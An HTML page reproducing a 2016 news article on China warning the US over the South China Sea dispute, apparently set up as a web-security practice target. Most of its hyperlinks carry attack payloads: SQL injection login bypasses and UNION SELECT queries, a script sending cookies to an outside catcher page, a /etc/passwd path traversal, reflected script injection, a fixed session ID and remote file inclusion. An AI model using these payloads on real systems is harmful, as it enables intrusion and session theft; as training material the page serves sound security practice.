<h2>Beijing warns US to stay out of South China Sea dispute </h2>

<p class="details">By Martin Farrer | Thursday 8 September 2016 07.20 BST<a href="#"></a> </p>

<p>
China has sent a <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">  coded warning </a> to the United States to stay out of the South China Sea dispute after Beijing was again accused of building permanent structures on <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">  islands in the area.</a>
</p> <p>
Speaking after talks with rival countries at a regional summit in Laos, premier Li Keqiang said China wanted to work with other countries to “dispel interference” in the contested maritime zone.
</p> 

<p><img class="alignright" src="/images/southchianasea.png" width="350" height="350" alt="southchianasea" /></p>
</p> 

<p>
But US president Barack Obama responded by warning that Beijing must abide by an international tribunal ruling that China’s sweeping claims to the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> South China Sea </a> had no legal basis.
</p> <p>
“The landmark arbitration ruling in July, which is binding, helped clarify maritime rights in the region,” Obama told a summit of <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  Asian leaders </a> in Laos on Thursday. Beijing has vowed to ignore the verdict.
</p> <p>
“I recognise this raises tensions,” Obama said referring to the ruling “but I also look forward to discussing how we can constructively move forward together to lower tensions and promote <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank" > diplomacy and stability.”</a>
</p> <p>
The Philippines said earlier on Wednesday it was <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  “gravely concerned” </a> that Chinese boats were preparing to build structures at a disputed shoal in the South China Sea, upsetting the diplomatic peace at the Association of Southeast Asian Nations (Asean) summit in Vientiane.
</p> <p>
China claims much of the South China Sea, through which more than  <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank"> $5 trillion of trade moves annually. </a> Vietnam, the Philippines, Malaysia, Brunei and Taiwan also have claims.
</p> <p>
 Officials said talks between regional leaders and Li on Wednesday went smoothly, but there was no reference to a July court ruling in The Hague that declared some of China’s artificial islands illegal and invalidated its claims to almost the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> entire waterway.</a>
</p> <p>
In a statement released later on Wednesday by China’s foreign ministry about the meeting, Li was paraphrased as saying China was willing to work with Asean countries in “dispelling interference ... and properly handling the <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">  South China Sea issue”.</a>
</p> <p>
He did not elaborate, but such wording is typically used by Chinese leaders to refer to not allowing countries from outside the region with no direct involvement in the dispute, like the United States, from getting involved.
</p> <p>
With joint efforts from China and Asean members, the situation in the South China Sea was moving in a positive direction, Li added.
</p> <p>
Peace and stability in the area was directly related to prosperity and development of .<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> neighbouring countries,</a> he said.
</p> <p>
“Countries in the region are the biggest beneficiaries of peace in the South China Sea. History and facts have repeatedly showed that the South China Sea can only be peaceful and stable so long as the regional countries themselves get hold of the key to fixing the problems,” Lie said.
</p> <p>
 Increasingly assertive action by China’s coast guard ships in the South China Sea risks destabilising the region, according to the authors of new research  <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> tracking maritime law enforcement </a> incidents across the vital trade route.
</p> <p>
Hours before the meeting, however, the Philippines’ defence ministry released photographs and a map showing what it said was an increased number of Chinese vessels near Scarborough Shoal, which China seized after a standoff in 2012.
</p> <p>
Li made no direct mention of Scarborough Shoal in the comments provided by the foreign ministry.

</p> 

